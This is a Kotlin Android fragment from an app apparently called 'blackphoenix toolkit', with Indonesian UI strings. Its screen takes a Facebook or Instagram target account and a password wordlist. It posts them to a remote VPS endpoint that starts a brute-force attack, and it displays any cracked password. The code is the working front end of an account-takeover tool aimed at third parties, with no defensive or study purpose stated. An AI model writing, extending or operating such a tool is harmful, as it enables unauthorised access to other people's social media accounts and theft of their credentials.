package com.blackphoenix.toolkit.fragments

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import com.blackphoenix.toolkit.R
import com.blackphoenix.toolkit.utils.VPSConfig
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class BruteFragment : Fragment() {

    private lateinit var spinnerPlatform: Spinner
    private lateinit var inputTarget: EditText
    private lateinit var inputWordlist: EditText
    private lateinit var btnStart: Button
    private lateinit var tvStatus: TextView

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        val view = inflater.inflate(R.layout.fragment_brute, container, false)

        spinnerPlatform = view.findViewById(R.id.spinnerPlatform)
        inputTarget = view.findViewById(R.id.inputTarget)
        inputWordlist = view.findViewById(R.id.inputWordlist)
        btnStart = view.findViewById(R.id.btnStart)
        tvStatus = view.findViewById(R.id.tvStatus)

        val platforms = arrayOf("facebook", "instagram")
        val adapter = ArrayAdapter(requireContext(), android.R.layout.simple_spinner_dropdown_item, platforms)
        spinnerPlatform.adapter = adapter

        btnStart.setOnClickListener { startBrute() }

        return view
    }

    private fun startBrute() {
        val platform = spinnerPlatform.selectedItem.toString()
        val target = inputTarget.text.toString().trim()
        val wordlistRaw = inputWordlist.text.toString().trim()

        if (target.isEmpty()) {
            Toast.makeText(requireContext(), "Masukkan target!", Toast.LENGTH_SHORT).show()
            return
        }

        val wordlist = wordlistRaw.split(",").map { it.trim() }.toTypedArray()

        tvStatus.text = "⏳ Brute forcing $platform..."
        tvStatus.setTextColor(0xffff8800)

        val client = OkHttpClient()
        val json = JSONObject()
        json.put("api_key", VPSConfig.API_KEY)
        json.put("platform", platform)
        json.put("target", target)
        json.put("wordlist", wordlist)

        val body = RequestBody.create(
            MediaType.parse("application/json; charset=utf-8"),
            json.toString()
        )

        val request = Request.Builder()
            .url("${VPSConfig.VPS_URL}/api/brute/start")
            .post(body)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                requireActivity().runOnUiThread {
                    tvStatus.text = "❌ Gagal konek ke VPS"
                    tvStatus.setTextColor(0xffff4444)
                }
            }

            override fun onResponse(call: Call, response: Response) {
                val res = response.body?.string() ?: ""
                requireActivity().runOnUiThread {
                    try {
                        val obj = JSONObject(res)
                        if (obj.getString("status") == "success") {
                            val password = obj.getString("password")
                            tvStatus.text = "✅ Password found: $password"
                            tvStatus.setTextColor(0xff00ff00)
                        } else {
                            tvStatus.text = "❌ ${obj.getString("message")}"
                            tvStatus.setTextColor(0xffff4444)
                        }
                    } catch (e: Exception) {
                        tvStatus.text = "❌ Error: ${e.message}"
                        tvStatus.setTextColor(0xffff4444)
                    }
                }
            }
        })
    }
}